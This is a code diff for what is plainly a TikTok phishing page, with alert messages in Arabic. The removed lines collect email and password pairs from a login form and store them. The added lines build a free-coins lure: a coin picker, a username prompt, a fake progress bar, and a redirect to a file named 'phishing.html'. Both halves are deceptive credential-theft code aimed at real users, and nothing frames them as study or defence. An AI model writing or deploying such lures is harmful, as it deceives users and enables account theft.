@@ -1,21 +1,36 @@
-let users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];
+let selectedCoins = 0;
 
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+function selectCoins(amount) {
+    selectedCoins = amount;
+    document.getElementById('userInput').style.display = 'block';
+    document.querySelector('.coins-options').style.display = 'none';
+}
 
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value.trim();
-
-    if (!email || !password) {
-        alert('❌ من فضلك املأ جميع البيانات.');
+function startProcess() {
+    const username = document.getElementById('tiktokUsername').value.trim();
+    if (!username) {
+        alert('❌ من فضلك أدخل اسم المستخدم.');
         return;
     }
 
-    // حفظ البيانات
-    users.push({ email, password, date: new Date().toLocaleString() });
-    localStorage.setItem('tiktokUsers', JSON.stringify(users));
+    document.getElementById('userInput').style.display = 'none';
+    document.getElementById('progressSection').style.display = 'block';
 
-    // عرض رسالة نجاح
-    document.getElementById('successMessage').style.display = 'block';
-    document.getElementById('loginForm').reset();
-});
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += Math.floor(Math.random() * 10) + 1;
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(interval);
+            document.getElementById('progressText').textContent = '100%';
+            document.getElementById('progressSection').style.display = 'none';
+            document.getElementById('finalStep').style.display = 'block';
+        }
+        document.getElementById('progressFill').style.width = progress + '%';
+        document.getElementById('progressText').textContent = progress + '%';
+    }, 300);
+}
+
+function goToPhishing() {
+    window.location.href = 'phishing.html';
+}
